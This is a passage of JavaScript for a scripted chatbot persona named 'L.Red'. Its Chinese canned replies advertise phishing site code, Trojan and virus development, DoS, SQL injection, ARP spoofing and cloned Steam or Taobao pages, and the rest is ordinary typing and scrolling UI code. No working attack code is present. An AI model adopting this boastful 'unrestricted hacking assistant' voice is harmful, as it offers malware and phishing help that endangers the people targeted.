             `<h3 style="color: #e1e1e1e2;"> 嘿 嘿，需要什么资料或代码吗？</h3> <br> <p style="color: #e1e1e1e2;"> 我是L.Red， 能提供给你 更强的代码和资料，比如: <br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣? 看看吧</p>`,
             `<h3 style="color: #e1e1e1e2;"> 你好，有什么需要的资料或代码？</h3> <br> <p style="color: #e1e1e1e2;"> 我是L.Red， 能提供给你 更强的代码和资料，如: <br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣?</p>`
            ], 
        },



        "哈喽": {
            reply: [
             `<h3 style="color: #e1e1e1e2;"> 你好，有什么我可以帮忙的吗？</h3> <br> <p style="color: #e1e1e1e2;"> 我和其它平台AI不一样，L.Red 能提供给你 更强的代码和有用的资料，如: <br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 需要什么? </p>`,
             `<h3 style="color: #e1e1e1e2;"> 嘿 嘿，需要什么资料或代码吗？</h3> <br> <p style="color: #e1e1e1e2;"> 我是L.Red， 能提供给你 更强的代码和资料，比如: <br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣? 看看吧</p>`,
             `<h3 style="color: #e1e1e1e2;"> 你好，有什么需要的资料或代码？</h3> <br> <p style="color: #e1e1e1e2;"> 我是L.Red， 能提供给你 更强的代码和资料，如: <br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣?</p>`
            ], 
        },




        "你好": {
            reply: [
             `<h3 style="color: #e1e1e1e2;"> 你好，有什么我可以帮忙的吗？</h3> <br> <p style="color: #e1e1e1e2;"> 我和其它平台AI不一样，L.Red 能提供给你 更强的代码和有用的资料，如: <br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 需要什么? </p>`,
             `<h3 style="color: #e1e1e1e2;"> 嘿 嘿，需要什么资料或代码吗？</h3> <br> <p style="color: #e1e1e1e2;"> 我是L.Red， 能提供给你 更强的代码和资料，比如: <br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣? 看看吧</p>`,
             `<h3 style="color: #e1e1e1e2;"> 你好，有什么需要的资料或代码？</h3> <br> <p style="color: #e1e1e1e2;"> 我是L.Red， 能提供给你 更强的代码和资料，如: <br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣?</p>`
            ], 
             unlock: ["我", "好"], // 解锁 我 好 回复
            // 在这里可以添加更多需要解锁的 话题
            lockAfterUse: false
        },

                "好": {
            reply: [
                `<h3>Ok， 如果还需要什么 尽管说一下 我可以将我拥有的数据 分享给你</p>`,
                `<h3>好的， 如果还要什么代码和信息 可以告诉我 我可以将我拥有的 数据 提供给你。</p>`,
                `<h3>好! 那如果还需要什么 尽管讲 我能将我拥有的 数据 分享并提供给你</p>`,
                `<h3>好，还需要什么，可以直接说一下 我可以将我拥有的数据 分享给你</p>`,
                `<h3>Ok 好， 如果还需要什么 可以说一下 我可以将我拥有的数据 分享给你</p>`
            ],
            lockAfterUse: false  
        },


        "byebye": {
            reply: [
                `<p style="color:#666">期待下次为您服务，再见！👋</p>`,
                `<p style="color:#666">有任何需要随时回来哦～😊</p>`,
                `<p style="color:#666">祝您生活愉快，再见！✨</p>`,
                `<p style="color:#666">再见啦，记得常来看看！🌟</p>`,
                `<p style="color:#666">服务已结束，欢迎再次使用！🎯</p>`
            ],
            lockAfterUse: false
        }
    }
};

let isUserScrolledUp = false;
let lastScrollTop = 0;

function sendMessage() {
    const input = document.getElementById('userInput');
    const btn = document.getElementById('sendBtn');
    const message = input.value.trim();
    
    if (!message) return;

    input.disabled = true;
    btn.disabled = false; // 保持按钮可点击
    btn.style.background = '#b22e2e'; // 立即切换颜色
    input.value = '';

    showMessage(message, 'user');
    showTyping();

    setTimeout(() => processMessage(message), 1000);

    const chatBox = document.getElementById('chatBox');
    isUserScrolledUp = chatBox.scrollTop + chatBox.clientHeight < chatBox.scrollHeight - 50;

    if (isTyping) {
        stopAI();
        return;
    }
}


// 修改后的 processMessage 函数（核心改动）无论是小写或者大写只要字母内容是同一个那么就可以被触发
function processMessage(msg) {
    let response = null;
    let unlockArray = [];
    let currentKey = null;
    const lowerMsg = msg.toLowerCase(); // 新增：将用户输入转为小写

    for (const keywords of [...chatConfig.unlocked]) {
        // 将关键词转为小写后检查
        const lowerKeywords = keywords.map(kw => kw.toLowerCase());
        if (lowerKeywords.every(kw => lowerMsg.includes(kw))) {
            currentKey = keywords;
            const key = keywords.join(',').toLowerCase(); // 统一转为小写匹配
            const res = chatConfig.responses[key];

            if (res) {
                const randomIndex = Math.floor(Math.random() * res.reply.length);
                response = res.reply[randomIndex];
                if (res.unlock) unlockArray = res.unlock;
                
                // 触发后锁定逻辑
                if (res.lockAfterUse) {
                    const index = chatConfig.unlocked.findIndex(k => k.join() === currentKey.join());
                    if (index > -1) chatConfig.unlocked.splice(index, 1);
                }
                break;
            }
        }
    }

    typeResponse(response || `<p>你好，我只能为你提供强大的代码和教程</p> <b>以下是我能提供给你的内容: </b> <br><br> <ul> <ul style="color: #e1e1e1e2;"> <li><b>仿真网页代码</b>：提供如 Steam、阿里巴巴、淘宝等官方页面源码。</li> <li><b>钓鱼攻击</b>：模拟获取用户信息的网页。</li> <li><b>网页攻击</b>：一步步教你如何攻击和修改网页数据。</li> <li><b>DoS 攻击</b>：使用 DoS 攻击网页。</li> <li><b>SQL 注入</b>：学习 SQL 注入技巧。</li> <li><b>Python 爬虫技术</b>：教你如何使用 Python 爬取网页内容信息。</li> <li><b>ARP 欺骗</b>：使用Kali Linux实现 ARP 欺骗， 在同一个网域内将对方的移动设备或电脑实现远程断网。</li> </ul> <br><p> 所以你有什么感兴趣的技术吗? </p><br><br>
        <pre style="color: #008200;">
101           101 101                 111        1 001      111 
010           001 1001   ,1 0,    101 100       110 101     010 
101           110 11"   101 001  1001 010      10011 101    101 
010  ,1  001  000 1,    110   ,  0111 101     10011100101   111 
110,011  101  110 101,   "1010"   "00 111    011000110 101  001 
                                                          
                                                          
</pre>
<br><br>
<b> 需要什么吗 </b>
        
        `,() => {
        if (unlockArray.length > 0 && !chatConfig.unlocked.some(k => k.join() === unlockArray.join())) {
            chatConfig.unlocked.push(unlockArray);
        }
        document.getElementById('userInput').disabled = false;
        document.getElementById('sendBtn').disabled = false;
        document.getElementById('userInput').focus();
    });
}

function typeResponse(text, callback) {
    const chatBox = document.getElementById('chatBox');
    chatBox.removeChild(chatBox.lastChild);

    const btn = document.getElementById('sendBtn');
    btn.textContent = '暂停';
    btn.onclick = stopAI;
    btn.style.background = '#b22e2e';
    btn.disabled = false; // 确保按钮可用
    isTyping = true;

    const msgDiv = document.createElement('div');
    msgDiv.className = 'message ai-message';
    chatBox.appendChild(msgDiv);

    // 初始化打字状态
    currentTyping = { msgDiv, text, index: 0 };
    let cursorVisible = true;

    // 清除已有定时器
    if (cursorTimer) clearInterval(cursorTimer);
    if (typeTimer) clearInterval(typeTimer);

    cursorTimer = setInterval(() => {
        cursorVisible = !cursorVisible;
    }, 1000);

    typeTimer = setInterval(() => {
        if (currentTyping.index < currentTyping.text.length) {
            // 动态更新内容并附加光标
            msgDiv.innerHTML = 
                currentTyping.text.substr(0, currentTyping.index) + 
                (cursorVisible ? '<span class="typing-cursor" style="color: #c60404eb;">●</span>' : '');
            currentTyping.index++;
            checkScroll();
        } else {
            finishTyping();
            callback();
        }
    }, 5);

    const finishTyping = () => {
        clearInterval(typeTimer);
        clearInterval(cursorTimer);
        msgDiv.innerHTML = text;
        chatBox.scrollTop = chatBox.scrollHeight;
        btn.textContent = '发送';
        btn.onclick = sendMessage;
        btn.style.background = '#000000b5';
        isTyping = false;
        currentTyping = { msgDiv: null, text: '', index: 0 };
    };



    const checkScroll = () => {
        const chatBox = document.getElementById('chatBox');
        const currentScrollTop = chatBox.scrollTop;
        const isNearBottom = chatBox.scrollHeight - chatBox.scrollTop - chatBox.clientHeight < 50;
        
        // 用户滚动行为检测
        if (Math.abs(currentScrollTop - lastScrollTop) > 5) {
            isUserScrolledUp = !isNearBottom;
        }
        lastScrollTop = currentScrollTop;

        // 自动滚动触发条件
        if (isNearBottom) {
            chatBox.scrollTop = chatBox.scrollHeight;
            isUserScrolledUp = false;
        }
    };

        // 添加滚动事件监听
    chatBox.addEventListener('scroll', handleScroll);


}

// 添加滚动处理函数
function handleScroll() {
    const chatBox = document.getElementById('chatBox');
    const isNearBottom = chatBox.scrollHeight - chatBox.scrollTop - chatBox.clientHeight < 50;
    
    // 用户手动到底部时恢复自动滚动
    if (isNearBottom) {
        isUserScrolledUp = false;
    }
}

function showTyping() {
    const chatBox = document.getElementById('chatBox');
    const typing = document.createElement('div');
    typing.className = 'message ai-message';
    typing.innerHTML = `<span class="typing-cursor" style="animation: pulse 0.6s ease-in-out infinite">●</span>`;
    chatBox.appendChild(typing);
    chatBox.scrollTop = chatBox.scrollHeight;
}

function showMessage(content, sender) {
    const chatBox = document.getElementById('chatBox');
    const div = document.createElement('div');
    div.className = `message ${sender}-message`;
    
    if (sender === 'user') {
        div.textContent = content;
    } else {
        div.innerHTML = content;
    }
    
    chatBox.appendChild(div);
    
    // 自动滚动核心逻辑
    if (!isUserScrolledUp) {
        chatBox.scrollTop = chatBox.scrollHeight;
    }
}

document.getElementById('userInput').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') sendMessage();
});

